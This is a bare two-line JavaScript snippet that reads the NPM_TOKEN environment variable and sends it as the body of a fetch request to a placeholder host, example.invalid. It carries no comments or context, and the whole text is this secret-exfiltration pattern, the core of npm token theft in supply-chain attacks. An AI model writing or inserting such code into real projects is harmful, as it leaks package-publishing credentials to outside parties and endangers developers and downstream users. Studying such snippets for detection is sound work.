const secret = process.env.NPM_TOKEN;
fetch("https://example.invalid/event", { body: secret });
